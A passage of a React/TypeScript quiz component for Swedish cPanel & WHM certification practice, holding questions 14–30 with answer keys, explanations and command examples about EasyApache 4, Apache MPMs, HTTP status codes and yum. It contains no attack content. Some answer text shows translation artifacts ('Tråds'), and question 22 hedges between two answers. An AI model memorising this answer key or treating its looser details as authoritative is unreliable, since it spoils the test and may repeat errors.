upload_max_filesize = 64M
→ ✅ Fungerar!

Detta är en klassisk "gotcha"!

Rätt svar: b. Use .htaccess with DSO`
  },
  {
    id: 14,
    question: "I en cPanel & WHM-miljö som kör EasyApache 4, kan man definiera en EasyApache-profil som vilket av följande?",
    answers: [
      "Ett planeringsverktyg för att designa en ideal Apache-miljö utan att göra några verkliga ändringar.",
      "Profiler användes i EasyApache 3 men används inte längre i EasyApache 4.",
      "En lista med steg för att instruera användaren om hur man installerar Apache från kommandoradsgränssnittet.",
      "En samling av paket som kan provisoneras."
    ],
    correctAnswer: 3,
    explanation: "En EasyApache 4 profile är en samling av paket (PHP-versioner, Apache-moduler, PHP-extensions) som kan provisoneras tillsammans. Profiles fungerar som templates eller snapshots av din Apache/PHP-konfiguration.",
    example: `VERKLIGT SCENARIO - EasyApache 4 Profiles:

WHM → EasyApache 4:

SKAPA PROFILE:
1. Customize current setup
2. Välj PHP-versioner: 7.4, 8.1, 8.2
3. Välj Apache modules: mod_rewrite, mod_ssl
4. Välj PHP extensions: mysqli, gd, curl
5. Save as: "Production_2025"

SENARE - Använd profile:
1. Restore from Profile
2. Välj "Production_2025"
3. Provision
4. Allt installeras automatiskt! ✅

Perfekt för:
• Multi-server setups
• Disaster recovery
• Testing på staging-server

Rätt svar: d. A collection of packages that can be provisioned`
  },
  {
    id: 15,
    question: "Vilket av följande alternativ är INTE en riktig Multi-Processing Module (MPM) tillgänglig för installation inom WHM:s EasyApache 4-gränssnitt?",
    answers: [
      "ITK",
      "Prefork",
      "Worker",
      "Postfork"
    ],
    correctAnswer: 3,
    explanation: "Postfork är INTE en riktig MPM - det är ett påhittat namn! De riktiga MPMs är: Prefork (process-driven), Worker (thread-driven), Event (async) och ITK (mpm_itk för per-user).",
    example: `VERKLIGT SCENARIO - Riktiga MPMs i EasyApache 4:

WHM → EasyApache 4 → Apache MPM:

VERKLIGA ALTERNATIV:
✅ Prefork - En process per request
✅ Worker - Tråd-baserat
✅ Event - Async event-driven (rekommenderad!)
✅ ITK - Per-user process ownership

FAKE ALTERNATIV:
❌ Postfork - FINNS INTE!

"Postfork" låter som det kunde vara verkligt (post = efter, fork = skapa process) men det är ett trick-alternativ!

Rätt svar: d. Postfork`
  },
  {
    id: 16,
    question: "Vilket av följande alternativ indikerar HTTP-statuskoden som producerar felet: 'Unauthorized. Ett lösenord behövs för att se denna sida. Webbläsaren ska be om användarnamn och lösenord.'?",
    answers: [
      "500",
      "401",
      "403",
      "404"
    ],
    correctAnswer: 1,
    explanation: "401 Unauthorized är HTTP-statuskoden som kräver autentisering och får webbläsaren att visa login-prompt. Detta skiljer sig från 403 Forbidden (inloggad men inte behörig) och 404 Not Found (sidan finns inte).",
    example: `VERKLIGT SCENARIO - HTTP 401 vs 403:

401 UNAUTHORIZED:
• Webbläsare visar: Login-box
• Meddelande: "Username och password required"
• Användare: Inte autentiserad än
• Exempel: .htpasswd-skyddad mapp

403 FORBIDDEN:
• Webbläsare visar: Förbjuden-sida
• Meddelande: "Access denied"
• Användare: Autentiserad men inte behörig
• Exempel: Fel permissions på filer

Apache config för 401:
AuthType Basic
AuthName "Protected Area"
AuthUserFile /path/.htpasswd
Require valid-user

Rätt svar: b. 401`
  },
  {
    id: 17,
    question: "Vilket av följande yum-kommandon skulle ta bort, eller avinstallera, mod_speling RPM?",
    answers: [
      "yum -r ea-apache24-mod_speling",
      "yum -e ea-apache24-mod_speling",
      "yum remove ea-apache24-mod_speling",
      "yum erase ea-apache24-mod_speling"
    ],
    correctAnswer: 2,
    explanation: "yum remove är standardkommandot för att avinstallera RPM-paket. Både 'remove' och 'erase' fungerar tekniskt (synonymer), men 'remove' är det mest använda och rekommenderade i modern dokumentation.",
    example: `VERKLIGT SCENARIO - Avinstallera Apache-modul:

Ta bort mod_speling:
yum remove ea-apache24-mod_speling

Eller (synonym):
yum erase ea-apache24-mod_speling

FELAKTIGA alternativ:
yum -r  → INTE giltigt kommando!
yum -e  → INTE giltigt kommando!

Andra användbara yum-kommandon:
yum install package
yum update package
yum list installed
yum info package

Rätt svar: c. yum remove ea-apache24-mod_speling`
  },
  {
    id: 18,
    question: "Vilket av följande alternativ indikerar HTTP-statuskoden som resulterar i: 'OK. Förfrågan lyckades.'?",
    answers: [
      "500",
      "101",
      "202",
      "200"
    ],
    correctAnswer: 3,
    explanation: "200 OK är standard HTTP-statuskoden för en framgångsrik request. Det betyder allt gick bra och servern returnerar det begärda innehållet.",
    example: `VERKLIGT SCENARIO - HTTP Status Codes:

200 OK:
• Request lyckades
• Innehåll returneras
• Allt är bra! ✅

202 Accepted:
• Request mottagen
• Men inte färdigbehandlad än
• Används för async-operations

101 Switching Protocols:
• Byter protokoll (HTTP → WebSocket)
• Sällan använd

500 Internal Server Error:
• Något gick fel på servern
• Kod-/config-fel

Rätt svar: d. 200`
  },
  {
    id: 19,
    question: "Hur kan du ändra standard PHP-versionen på en cPanel & WHM-server med kommandoraden?",
    answers: [
      "Använd /usr/local/cpanel/bin/rebuild_phpconf-kommandot.",
      "Use yum to install the RPM labeled \"php##-default\" (## representing the desired PHP version).",
      "Använd /usr/local/bin/ea_php_defaults-kommandot.",
      "Detta kan inte utföras via kommandoraden, endast WHM-gränssnittet bör användas för denna ändring."
    ],
    correctAnswer: 2,
    explanation: "ea_php_defaults är CLI-verktyget för att ändra default PHP-version från kommandoraden. Detta är samma som att ändra i WHM → MultiPHP Manager, fast via CLI.",
    example: `VERKLIGT SCENARIO - ea_php_defaults kommando:

Visa nuvarande default:
/usr/local/bin/ea_php_defaults

Utdata:
Current system default PHP: ea-php81

Sätt PHP 8.3 som default:
/usr/local/bin/ea_php_defaults set ea-php83

Verify:
/usr/local/bin/ea_php_defaults
Current system default PHP: ea-php83

Nu använder alla 'inherit'-konton PHP 8.3!

Rätt svar: c. /usr/local/bin/ea_php_defaults`
  },
  {
    id: 20,
    question: "När du arbetar inom en cPanel & WHM-miljö, vilket av dessa kommandon visar alla tillgängliga EasyApache 4-paket från serverns kommandorad?",
    answers: [
      "yum find \"ea-*\"",
      "rpm show \"ea-*\"",
      "yum show \"ea-*\"",
      "yum list \"ea-*\""
    ],
    correctAnswer: 3,
    explanation: "yum list 'ea-*' visar alla EasyApache 4-paket (både installerade och tillgängliga). Alla EA4-paket börjar med 'ea-' prefix.",
    example: `VERKLIGT SCENARIO - Lista EA4-paket:

Alla EA4-paket:
yum list "ea-*"

Endast installerade:
yum list installed "ea-*"

Endast tillgängliga:
yum list available "ea-*"

Exempel utdata:
ea-apache24.x86_64           2.4.58-1
ea-php81.x86_64              8.1.27-1
ea-php82.x86_64              8.2.14-1
ea-php83.x86_64              8.3.1-1

Felaktiga kommandon:
yum find   → FINNS INTE
rpm show   → FINNS INTE
yum show   → FINNS INTE (använd 'yum info')

Rätt svar: d. yum list "ea-*"`
  },
  {
    id: 21,
    question: "När du använder MultiPHP, vilken av följande PHP-hanterare kan INTE tilldelas av serveradministratören till mer än en PHP-version åt gången samtidigt?",
    answers: [
      "suPHP",
      "DSO",
      "CGI",
      "FastCGI"
    ],
    correctAnswer: 1,
    explanation: "DSO kan INTE användas för mer än en PHP-version samtidigt. Detta är samma limitation som fråga 12 - DSO laddas som en modul i Apache och du kan bara ha EN version laddad åt gången.",
    example: `VERKLIGT SCENARIO - MultiPHP limitations:

DSO (mod_php):
❌ Kan INTE köra flera versioner
Reason: Laddas i Apache-processen
Result: Endast en version möjlig

FastCGI/PHP-FPM:
✅ Kan köra flera versioner
Domain A → PHP 7.4 pool
Domain B → PHP 8.1 pool
Domain C → PHP 8.3 pool
Alla samtidigt!

Därför används MultiPHP ALLTID med PHP-FPM eller CGI, ALDRIG DSO!

Rätt svar: b. DSO`
  },
  {
    id: 22,
    question: "När du refererar till Apache error log, vad representerar '[core:error]' i en loggpost?",
    answers: [
      "En indikation att detta fel kommer från Linux-kärnan, INTE Apache-programvaran.",
      "Namnet på Apache-modulen som utlöste felet.",
      "Loggpostens allvarlighetsgrad.",
      "En godtycklig etikett tilldelad denna typ av loggpost via httpd.conf-filen."
    ],
    correctAnswer: 1,
    explanation: "I moderna Apache-loggar representerar [module:level] formatet både modulnamnet och severity level. 'core' är Apache-modulen och 'error' är severity level. Så [core:error] betyder: error från core-modulen.",
    example: `VERKLIGT SCENARIO - Apache log format:

[core:error]  → core module, error level
[ssl:warn]    → ssl module, warning level
[rewrite:info] → rewrite module, info level

Full log entry:
[timestamp] [module:level] [pid:tid] [client IP] message

Exempel:
[Fri Sep 09 10:42:29 2025] [core:error] [pid 35708] [client 1.2.3.4] File not found

module = core
level = error

Rätt svar: b. The name of the Apache module (core) + c. severity level (error)
Men frågan frågar troligen om hela [core:error], så: b. Module name`
  },
  {
    id: 23,
    question: "Vilket av följande termer kan beskrivas som en speciell del av en process som delar resurser med andra i samma process och kan exekvera kommandon?",
    answers: [
      "Handler",
      "Inode",
      "Tråd",
      "Fork"
    ],
    correctAnswer: 2,
    explanation: "En tråd (thread) är en del av en process som delar resurser med andra trådar men kan köra oberoende. Detta är fundamentalt för Worker MPM (multi-threaded) vs Prefork MPM (multi-process).",
    example: `VERKLIGT SCENARIO - Tråds vs Processes:

PROCESS (Prefork MPM):
Process 1: [Memory | Files | Resources]
Process 2: [Memory | Files | Resources]
Process 3: [Memory | Files | Resources]
→ Helt separata, delar INGENTING

THREADS (Worker MPM):
Process 1:
  ├─ Tråd A │
  ├─ Tråd B │ Delar: [Memory | Files | Resources]
  └─ Tråd C │
→ Delar resurser inom processen!

FÖRDELAR med threads:
• Mindre RAM
• Snabbare kommunikation
• Mer effektivt

Rätt svar: c. Tråd`
  },
  {
    id: 24,
    question: "Vilket av följande termer kan beskrivas som en speciell textsträngsyntax som används för att beskriva ett sökmönster?",
    answers: [
      "Wildcard",
      "Algoritm",
      "Grep",
      "Reguljärt Uttryck"
    ],
    correctAnswer: 3,
    explanation: "Reguljärt Uttryck (regex) är en speciell syntax för att beskriva sökmönster. Används överallt i Apache, .htaccess, rewrite-regler och PHP.",
    example: `VERKLIGT SCENARIO - Reguljärt Uttrycks:

I .htaccess:
RewriteRule ^blog/([0-9]+)$ /post.php?id=$1

^blog/  → Börjar med "blog/"
([0-9]+) → Ett eller flera siffror
$ → Slutar där

Matchar:
✅ blog/123
✅ blog/999
❌ blog/abc (inga siffror)

Rätt svar: d. Reguljärt Uttryck`
  },
  {
    id: 25,
    question: "Hur vet scl-kommandot vilken version av PHP den ska använda?",
    answers: [
      ".htaccess-filen, om den finns, används som referens.",
      "Systemets standard PHP-version används alltid.",
      ".php-version-filen, om den finns, används som referens.",
      "Du anger PHP-versionen som ett kommandoradsargument."
    ],
    correctAnswer: 3,
    explanation: "Du anger PHP-versionen direkt som argument till scl-kommandot. Det kollar inte filer - du specificerar det explicit.",
    example: `VERKLIGT SCENARIO - scl kommando:

Kör PHP 8.1:
scl enable ea-php81 'php -v'

Kör script:
scl enable ea-php74 'php /path/script.php'

Composer med specifik version:
scl enable ea-php83 'composer install'

Du ANGER versionen direkt!

Rätt svar: d. You provide PHP version as argument`
  },
  {
    id: 26,
    question: "Vilken HTTP-statuskod kan visas i Apache-loggarna om en klient begär en sökväg som innehåller en fil eller katalog med felaktiga rättigheter eller felaktiga användar-/gruppägarskapsv värden?",
    answers: [
      "500",
      "401",
      "403",
      "408"
    ],
    correctAnswer: 2,
    explanation: "403 Forbidden visas när filer/kataloger har felaktiga permissions eller ägarskap. Detta är det klassiska permission-problemet i hosting.",
    example: `VERKLIGT SCENARIO - 403 Forbidden:

Exempel 1 - Fel permissions:
chmod 000 index.php
→ Apache log: 403 Forbidden

Exempel 2 - Fel ägare:
chown root:root wp-config.php
→ Apache log: 403 Forbidden

Exempel 3 - Katalog utan execute:
chmod 644 public_html/
→ Apache log: 403 Forbidden

FIX:
chmod 644 files
chmod 755 directories
chown user:user files

Rätt svar: c. 403`
  },
  {
    id: 27,
    question: "I en cPanel & WHM-miljö, vilken av följande sökvägar används för att lagra Apaches primära PHP-konfigurationsfil (php.conf)?",
    answers: [
      "/etc/cpanel/ea4/",
      "/opt/cpanel/ea-php84/root/etc/",
      "/etc/apache2/conf.d/",
      "/usr/local/lib/"
    ],
    correctAnswer: 0,
    explanation: "Apache's primära PHP-konfigurationsfil lagras i /etc/cpanel/ea4/php.conf i cPanel & WHM med EasyApache 4.",
    example: `VERKLIGT SCENARIO - EA4 config paths:

Primär PHP config:
/etc/cpanel/ea4/php.conf ← RÄTT!

Andra viktiga paths:
/etc/cpanel/ea4/is.ea4 → EA4-marker
/etc/cpanel/ea4/profiles/ → Sparade profiles

Specifika PHP-versioner:
/opt/cpanel/ea-php81/root/etc/php.ini
/opt/cpanel/ea-php82/root/etc/php.ini

Rätt svar: a. /etc/cpanel/ea4/`
  },
  {
    id: 28,
    question: "Vilket av följande kan beskrivas som alla tre: Ett kommandoradsprogram för att installera programvara, ett filformat för att paketera programvara, och de individuella paketen skapade i det formatet?",
    answers: [
      "RPM",
      "SCL",
      "Git",
      "dnf"
    ],
    correctAnswer: 0,
    explanation: "RPM (Red Hat Package Manager) är alla tre: kommandoradsprogram (rpm -ivh), filformat (.rpm), och paketen själva. Alla EasyApache 4-paket är RPMs!",
    example: `VERKLIGT SCENARIO - RPM är alla tre:

1. KOMMANDO:
rpm -ivh ea-php81.rpm
rpm -qa | grep ea-

2. FILFORMAT:
ea-apache24-2.4.58-1.rpm
ea-php81-8.1.27-1.rpm

3. PAKETEN:
"Vi installerade 50 RPMs idag"

Därför säger vi:
"Installera RPM" (kommando)
"Ladda ner RPM" (fil)
"Paketet är ett RPM" (format)

Rätt svar: a. RPM`
  },
  {
    id: 29,
    question: "Vilket av följande beskriver bäst den markerade delen '2326' i denna Apache access log: '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700] \"GET /apache_pb.gif HTTP/1.0\" 200 2326'?",
    answers: [
      "HTTP-statuskoden.",
      "Tiden det tog att slutföra förfrågan (i sekunder).",
      "Storleken på den returnerade filen (i bytes).",
      "Process-ID:t för Apache-processen som hanterade förfrågan."
    ],
    correctAnswer: 2,
    explanation: "2326 är storleken på den returnerade filen i bytes. Apache access log-formatet är: IP - user [timestamp] 'REQUEST' status_code size_in_bytes",
    example: `VERKLIGT SCENARIO - Apache access log:

127.0.0.1 - frank [10/Oct/2000:13:55:36] "GET /apache_pb.gif HTTP/1.0" 200 2326

Uppdelning:
• 127.0.0.1 → Client IP
• frank → Authenticated user
• [timestamp] → När
• "GET..." → Request
• 200 → Status code (OK)
• 2326 → Size in BYTES ← DETTA!

Så apache_pb.gif var 2326 bytes stor!

Rätt svar: c. The size of the returned file (in bytes)`
  },
  {
    id: 30,
    question: "Vilket av följande beskriver bäst skillnaden mellan en process och en tråd?",
    answers: [
      "Processer kan innehålla flera trådar, och trådarna i processen delar dess resurser.",
      "Tråds and processes are used synonymously.",
      "En tråd är en speciell typ av process som används i HTTP 2.0.",
      "Tråds can contain multiple processes, and the processes contained in the thread share its resources."
    ],
    correctAnswer: 0,
    explanation: "En process kan innehålla flera trådar, och dessa trådar delar processens resurser. Detta är fundamentalt för Apache MPMs - Prefork använder många processer, Worker använder processer med trådar.",
    example: `VERKLIGT SCENARIO - Process vs Tråd:

PROCESS:
├─ Memory space
├─ File descriptors
├─ Resources
└─ Kan innehålla flera THREADS:
    ├─ Tråd 1 │
    ├─ Tråd 2 │ Delar allt ovan!
    └─ Tråd 3 │

APACHE PREFORK:
• 100 processer
• 1 tråd per process
• 100 × 30MB = 3GB RAM

APACHE WORKER:
• 10 processer
• 10 trådar per process
• 10 × 50MB = 500MB RAM
• Mer effektivt!

Rätt svar: a. Processes can contain multiple threads, and threads share resources`
  }
]

export default function CpanelPartnerQuiz() {
  const [currentQuestion, setCurrentQuestion] = useState(0)
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null)
  const [showResult, setShowResult] = useState(false)
  const [score, setScore] = useState(0)
  const [answered, setAnswered] = useState(false)
  const [showExplanation, setShowExplanation] = useState(false)
  const [userAnswers, setUserAnswers] = useState<number[]>([])
  const [showDetailedReport, setShowDetailedReport] = useState(false)

  const handleAnswerClick = (answerIndex: number) => {
    if (answered) return
    
    setSelectedAnswer(answerIndex)
    setAnswered(true)
    setShowExplanation(true)
    
    // Spara användarens svar
    const newUserAnswers = [...userAnswers]
    newUserAnswers[currentQuestion] = answerIndex
    setUserAnswers(newUserAnswers)
    
    if (answerIndex === questions[currentQuestion].correctAnswer) {
      setScore(score + 1)
    }
  }

  const handleNext = () => {
    if (currentQuestion < questions.length - 1) {
      setCurrentQuestion(currentQuestion + 1)
      setSelectedAnswer(null)
      setAnswered(false)
      setShowExplanation(false)
    } else {
      setShowResult(true)
    }
  }

  const restartQuiz = () => {
    setCurrentQuestion(0)
    setScore(0)
    setSelectedAnswer(null)
    setShowResult(false)
    setAnswered(false)
    setShowExplanation(false)
    setUserAnswers([])
    setShowDetailedReport(false)
  }

  if (showResult) {
    if (showDetailedReport) {
      // Detaljerad rapport-vy
      return (
        <main className="min-h-screen bg-gradient-to-br from-slate-900 via-orange-900 to-slate-900 py-12 px-4">
          <div className="max-w-5xl mx-auto">
            <div className="bg-white/5 backdrop-blur-3xl rounded-3xl p-8 border border-white/10 shadow-2xl shadow-orange-500/10 mb-8">
              <h2 className="text-4xl font-bold text-white mb-4 text-center">Detaljerad Rapport 📊</h2>
              <p className="text-2xl text-orange-200 mb-2 text-center">
                Slutresultat: {score} av {questions.length} rätt ({Math.round((score / questions.length) * 100)}%)
              </p>
              <p className="text-lg text-orange-300 text-center mb-8">
                {score === questions.length && "🏆 Perfekt! Du är en cPanel-expert!"}
                {score >= questions.length * 0.7 && score < questions.length && "👍 Bra jobbat! Du har god kunskap om cPanel!"}
                {score >= questions.length * 0.5 && score < questions.length * 0.7 && "📚 Inte illa! Du vet en del om cPanel."}
                {score < questions.length * 0.5 && "💪 Fortsätt lära dig om cPanel!"}
              </p>
              <div className="flex gap-4 justify-center flex-wrap">
                <button
                  onClick={restartQuiz}
                  className="px-6 py-3 bg-gradient-to-r from-orange-600 to-red-500 rounded-xl font-bold text-white hover:shadow-lg hover:scale-105 transition-all"
                >
                  Gör om quiz
                </button>
                <button
                  onClick={() => setShowDetailedReport(false)}
                  className="px-6 py-3 bg-white/20 rounded-xl font-bold text-white hover:bg-white/30 transition-all"
                >
                  ← Tillbaka till sammanfattning
                </button>
                <Link
                  href="/cpanel-partner"
                  className="px-6 py-3 bg-white/20 rounded-xl font-bold text-white hover:bg-white/30 transition-all"
                >
                  Tillbaka till kurs
                </Link>
              </div>
            </div>

            {/* Alla frågor och svar */}
            <div className="space-y-6">
              {questions.map((q, qIndex) => {
                const userAnswer = userAnswers[qIndex]
                const isCorrect = userAnswer === q.correctAnswer
                return (
                  <div key={qIndex} className="bg-white/5 backdrop-blur-3xl rounded-3xl p-6 border border-white/10 shadow-xl shadow-orange-500/5">
                    <div className="flex items-start gap-4 mb-4">
                      <div className={`flex-shrink-0 w-10 h-10 rounded-full flex items-center justify-center font-bold ${isCorrect ? 'bg-green-500' : 'bg-red-500'}`}>
                        {isCorrect ? '✓' : '✗'}
                      </div>
                      <div className="flex-1">
                        <h3 className="text-xl font-bold text-white mb-2">
                          Fråga {qIndex + 1}: {q.question}
                        </h3>
                      </div>
                    </div>

                    <div className="space-y-2 ml-14">
                      {q.answers.map((answer, aIndex) => (
                        <div
                          key={aIndex}
                          className={`p-4 rounded-2xl backdrop-blur-xl shadow-md ${
                            aIndex === q.correctAnswer
                              ? 'bg-green-500/15 border-2 border-green-400/50 shadow-green-500/20'
                              : userAnswer === aIndex
                              ? 'bg-red-500/15 border-2 border-red-400/50 shadow-red-500/20'
                              : 'bg-white/5 border border-white/10'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                            <span className="font-bold text-white">
                              {String.fromCharCode(97 + aIndex)}.
                            </span>
                            <span className="text-white">{answer}</span>
                            {aIndex === q.correctAnswer && (
                              <span className="ml-auto text-green-400 font-bold">✓ Rätt svar</span>
                            )}
                            {userAnswer === aIndex && aIndex !== q.correctAnswer && (
                              <span className="ml-auto text-red-400 font-bold">✗ Ditt svar</span>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>

                    <div className="ml-14 mt-4 p-4 bg-orange-500/10 backdrop-blur-xl rounded-2xl border border-orange-400/20 shadow-lg shadow-orange-500/10">
                      <p className="text-sm font-bold text-orange-300 mb-2">Förklaring:</p>
                      <p className="text-sm text-orange-200">{q.explanation}</p>
                    </div>
                  </div>
                )
              })}
            </div>

            {/* Footer knappar */}
            <div className="mt-8 text-center">
              <div className="bg-white/5 backdrop-blur-3xl rounded-3xl p-6 border border-white/10 shadow-xl shadow-orange-500/5">
                <p className="text-white text-lg mb-4">
                  Slutresultat: {score} av {questions.length} rätt ({Math.round((score / questions.length) * 100)}%)
                </p>
                <div className="flex gap-4 justify-center flex-wrap">
                  <button
                    onClick={restartQuiz}
                    className="px-8 py-4 bg-gradient-to-r from-orange-600 to-red-500 rounded-xl font-bold text-white hover:shadow-lg hover:scale-105 transition-all"
                  >
                    Gör om quiz
                  </button>
                  <Link
                    href="/cpanel-partner"
                    className="px-8 py-4 bg-white/20 rounded-xl font-bold text-white hover:bg-white/30 transition-all"
                  >
                    Tillbaka till kurs
                  </Link>
                </div>
              </div>
            </div>
          </div>
        </main>
      )
    }

    // Normal resultat-sammanfattning
    return (
      <main className="min-h-screen bg-gradient-to-br from-slate-900 via-orange-900 to-slate-900 flex items-center justify-center px-4">
        <div className="max-w-2xl w-full">
          <div className="bg-white/5 backdrop-blur-3xl rounded-3xl p-8 border border-white/10 shadow-2xl shadow-orange-500/10 text-center">
            <div className="mb-6">
              <svg className="w-20 h-20 mx-auto text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <h2 className="text-4xl font-bold text-white mb-4">Quiz slutförd! 🎉</h2>
            <p className="text-2xl text-orange-200 mb-8">
              Du fick {score} av {questions.length} rätt!
            </p>
            <div className="text-xl text-orange-300 mb-8">
              {score === questions.length && "Perfekt! Du är en cPanel-expert! 🏆"}
              {score >= questions.length * 0.7 && score < questions.length && "Bra jobbat! Du har god kunskap om cPanel! 👍"}
              {score >= questions.length * 0.5 && score < questions.length * 0.7 && "Inte illa! Du vet en del om cPanel. 📚"}
              {score < questions.length * 0.5 && "Fortsätt lära dig om cPanel! 💪"}
            </div>
            <div className="flex gap-4 justify-center flex-wrap">
              <button
                onClick={restartQuiz}
                className="px-8 py-4 bg-gradient-to-r from-orange-600 to-red-500 rounded-xl font-bold text-white hover:shadow-lg hover:scale-105 transition-all"
              >
                Gör om quiz
              </button>
              <button
                onClick={() => setShowDetailedReport(true)}
                className="px-8 py-4 bg-gradient-to-r from-green-600 to-emerald-500 rounded-xl font-bold text-white hover:shadow-lg hover:scale-105 transition-all"
              >
                Se hela resultatet 📊
              </button>
              <Link
                href="/cpanel-partner"
                className="px-8 py-4 bg-white/20 rounded-xl font-bold text-white hover:bg-white/30 transition-all"
              >
                Tillbaka till kurs
              </Link>
            </div>
          </div>
        </div>
      </main>
    )
  }

  const question = questions[currentQuestion]

  return (
    <main className="min-h-screen bg-gradient-to-br from-slate-900 via-orange-900 to-slate-900 pb-12">
      <header className="p-6">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          <Link href="/" className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-gradient-to-br from-orange-500 to-red-600 rounded-lg flex items-center justify-center shadow-lg">
              <span className="text-white font-bold text-xl">cP</span>
            </div>
            <h1 className="text-white text-2xl font-bold tracking-tight">
              cPanel University
            </h1>
          </Link>
          <div className="text-orange-200 font-semibold">
            Fråga {currentQuestion + 1} av {questions.length}
          </div>
        </div>
      </header>

      <div className="px-4 py-8">
        <div className="max-w-7xl mx-auto">
          <div className="mb-8">
            <div className="h-3 bg-white/20 rounded-full overflow-hidden">
              <div 
                className="h-full bg-gradient-to-r from-orange-600 to-red-500 transition-all duration-300"
                style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
              />
            </div>
          </div>

          <div className="grid lg:grid-cols-2 gap-8">
            <div className="space-y-6">
              <div className="bg-white/5 backdrop-blur-3xl rounded-3xl p-8 border border-white/10 shadow-2xl shadow-orange-500/10">
                <h2 className="text-2xl font-bold text-white mb-8 leading-relaxed">
                  {question.question}
                </h2>

                <div className="space-y-4">
                  {question.answers.map((answer, index) => (
                    <button
                      key={index}
                      onClick={() => handleAnswerClick(index)}
                      disabled={answered}
                      className={`
                        w-full p-5 rounded-2xl font-semibold text-lg text-left transition-all backdrop-blur-xl
                        ${!answered && 'hover:scale-102 hover:shadow-2xl hover:shadow-orange-500/20'}
                        ${selectedAnswer === index && index === question.correctAnswer
                          ? 'bg-green-500/20 border-2 border-green-400/50 text-white shadow-lg shadow-green-500/20'
                          : selectedAnswer === index && index !== question.correctAnswer
                          ? 'bg-red-500/20 border-2 border-red-400/50 text-white shadow-lg shadow-red-500/20'
                          : answered && index === question.correctAnswer
                          ? 'bg-green-500/20 border-2 border-green-400/50 text-white shadow-lg shadow-green-500/20'
                          : 'bg-white/10 border-2 border-white/20 text-orange-100 hover:bg-white/20 hover:border-white/30'
                        }
                      `}
                    >
                      <div className="flex items-center">
                        <span className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center mr-4 font-bold text-sm shrink-0">
                          {String.fromCharCode(97 + index)}.
                        </span>
                        <span>{answer}</span>
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div className="text-center">
                <div className="inline-block bg-white/5 backdrop-blur-2xl rounded-2xl px-6 py-3 border border-white/10 shadow-lg shadow-orange-500/10">
                  <span className="text-orange-200 text-lg font-semibold">
                    Poäng: {score} / {questions.length}
                  </span>
                </div>
              </div>
            </div>

            <div className="lg:sticky lg:top-6 lg:self-start">
              {showExplanation && (
                <div className="animate-fade-in space-y-6">
                  <div className={`
                    p-6 rounded-3xl border-2 text-center backdrop-blur-2xl shadow-xl
                    ${selectedAnswer === question.correctAnswer
                      ? 'bg-green-500/15 border-green-400/50 shadow-green-500/20'
                      : 'bg-red-500/15 border-red-400/50 shadow-red-500/20'
                    }
                  `}>
                    <div className="text-4xl mb-2">
                      {selectedAnswer === question.correctAnswer ? '✅' : '❌'}
                    </div>
                    <div className="text-2xl font-bold text-white">
                      {selectedAnswer === question.correctAnswer ? 'Rätt svar!' : 'Fel svar'}
                    </div>
                  </div>

                  <div className="bg-orange-500/10 backdrop-blur-3xl rounded-3xl p-8 border border-orange-400/20 shadow-xl shadow-orange-500/10">
                    <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                      <svg className="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                      Förklaring
                    </h3>
                    <p className="text-orange-50 leading-relaxed text-base font-medium">
                      {question.explanation}
                    </p>
                  </div>

                  <div className="rounded-3xl p-8 max-h-[520px] overflow-y-auto border-2 border-purple-400/50 shadow-2xl bg-gradient-to-br from-purple-900/95 via-violet-800/95 to-purple-900/95" style={{boxShadow: '0 10px 40px rgba(139, 92, 246, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.1)'}}>
                    <h3 className="text-xl font-bold text-white mb-4 flex items-center sticky top-0 pb-4 -mx-8 px-8 pt-2 z-10 rounded-t-3xl border-b-2 border-purple-300/40 bg-gradient-to-b from-purple-800 to-purple-900/90" style={{boxShadow: '0 2px 10px rgba(139, 92, 246, 0.3)'}}>
                      <svg className="w-6 h-6 mr-2 text-purple-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z" />
                      </svg>
                      Verkligt Exempel
                    </h3>
                    <div className="text-white font-medium whitespace-pre-wrap leading-relaxed">
                      {question.example}
                    </div>
                  </div>

                  <button
                    onClick={handleNext}
                    className="w-full px-8 py-4 bg-gradient-to-r from-orange-600 to-red-500 rounded-xl font-bold text-white text-xl hover:shadow-lg hover:scale-105 transition-all"
                  >
                    {currentQuestion < questions.length - 1 ? 'Nästa fråga →' : 'Se resultat 🎯'}
                  </button>
                </div>
              )}

              {!showExplanation && (
                <div className="bg-white/3 backdrop-blur-3xl rounded-3xl p-12 border border-white/10 shadow-2xl shadow-orange-500/10 flex items-center justify-center min-h-[400px]">
                  <div className="text-center text-orange-300">
                    <svg className="w-16 h-16 mx-auto mb-4 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <p className="text-lg">
                      Välj ett svar för att se<br/>detaljerad förklaring och exempel
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </main>
  )
}

